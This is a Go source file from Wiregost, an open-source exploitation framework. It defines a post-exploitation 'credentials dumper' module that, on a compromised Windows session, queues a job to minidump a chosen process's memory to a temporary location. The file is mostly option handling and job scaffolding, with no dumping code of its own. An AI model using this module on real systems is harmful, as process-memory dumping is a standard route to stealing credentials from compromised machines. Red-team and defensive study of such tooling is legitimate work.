// Wiregost - Golang Exploitation Framework
// Copyright © 2020 Para
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

package minidump

import (
	"fmt"
	"strconv"
	"strings"

	"github.com/maxlandon/wiregost/server/log"
	"github.com/maxlandon/wiregost/server/module/templates"
)

// [ Base Methods ] ------------------------------------------------------------------------//

// Minidump - Credentials dumper module
type Minidump struct {
	*templates.Module
}

// New - Instantiates a Minidump module, empty.
func New() *Minidump {
	mod := &Minidump{&templates.Module{}}
	mod.Path = []string{"post/windows/x64/go/credentials/minidump"}
	return mod
}

var modLog = log.ServerLogger("windows/x64/go/credentials/minidump", "module")

// [ Module  Methods ] ------------------------------------------------------------------------//

// Run - Module entrypoint. ** DO NOT ERASE **
func (s *Minidump) Run(command string) (result string, err error) {

	// Check options
	if ok, err := s.CheckRequiredOptions(); !ok {
		return "", err
	}

	// Check session
	sess, err := s.CheckSession()
	if sess == nil {
		return "", err
	}

	commandList, err := s.Parse()
	result = strings.Join(commandList, " ")

	return result, nil
}

func (s *Minidump) Parse() ([]string, error) {
	// Convert PID to integer
	if s.Options["PID"].Value != "" && s.Options["PID"].Value != "0" {
		_, errPid := strconv.Atoi(s.Options["PID"].Value)
		if errPid != nil {
			return nil, fmt.Errorf("there was an error converting the PID to an integer:\r\n%s", errPid.Error())
		}
	}

	command, errCommand := GetJob(s.Options["Process"].Value, s.Options["PID"].Value, s.Options["TempLocation"].Value)
	if errCommand != nil {
		return nil, fmt.Errorf("there was an error getting the minidump job:\r\n%s", errCommand.Error())
	}

	return command, nil
}

// GetJob returns a string array containing the commands, in the proper order, to be used with agents.AddJob
func GetJob(process string, pid string, tempLocation string) ([]string, error) {
	return []string{"Minidump", process, pid, tempLocation}, nil
}
